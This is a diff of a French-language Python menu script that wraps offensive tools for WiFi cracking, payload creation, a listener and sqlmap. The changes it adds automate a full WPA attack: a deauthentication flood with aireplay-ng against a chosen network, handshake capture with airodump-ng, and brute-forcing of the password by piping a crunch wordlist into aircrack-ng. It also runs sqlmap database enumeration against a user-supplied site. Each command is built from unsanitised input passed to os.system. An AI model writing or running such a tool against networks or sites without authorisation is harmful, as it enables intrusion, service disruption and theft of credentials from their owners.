@@ -1,6 +1,5 @@
 import os
 import time
-
 options = ["1 : crack wifi ", "2 : Creer un payload ",  "3 : lancer un listener", "4 : sqlmap"]
 i = 0
 while i != 4:
@@ -10,6 +9,8 @@ choice = str(input("Quel nombre: "))
 if choice == "0":
     print("Il faut chosir un nombre entre 1 et 4")
 elif choice == "1":
+
+    os.system("iwconfig")
     interface = str(input("Entrer le nom de l'interface wifi : "))
     os.system("sudo airmon-ng start " + interface)
     print("Appuyer sur ctrl C quand vous voyez le bon reseau.")
@@ -17,8 +18,15 @@ elif choice == "1":
     os.system("sudo airodump-ng wlan0mon")
     bssid = input("Entrer le bssid : ")
     channel = input("Entrer le numero de channel : ")
-    os.system("xterm -e 'sudo airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon' & xterm -e 'aireplay-ng -0 15 -a " + bssid + " wlan0mon' ")
-    print("Le handshake a ete capturee pour le cracker utiliser la commande ")
+    os.system("mkdir handshake")
+    os.system("xterm -e 'airodump-ng -c " + channel + " --bssid " + bssid + " -w outpout wlan0mon' & xterm -e 'aireplay-ng -0 15 -a " + bssid + " wlan0mon' ")
+    os.system( "rm outpout*.csv outpout*.netxml")
+    os.system("mv outpout*.cap " + bssid)
+    os.system("mv " + bssid + " handshake/")
+    print("Le handshake a ete capturee, il va etre cracker avec crunch et aircrack-ng")
+    minimal = str(input("Entrer la longueur minimal : "))
+    maximal = str(input("Entrer la longueur maximal : ")) 
+    os.system("crunch " + minimal + " " + maximal + " abcdefghijklmnopqrstuvwxyz0123456789  | aircrack-ng -w - -b " + bssid + " handshake/" + bssid)
 
 elif choice == "2":
     print("1 : windows ")
@@ -65,5 +73,5 @@ elif choice == "4":
     os.system("sqlmap -u " + site + " --dbs")
 else:
     print("erreur veuliiez ressayer")
-    os.system("echo pas repertorie")
+ 
 
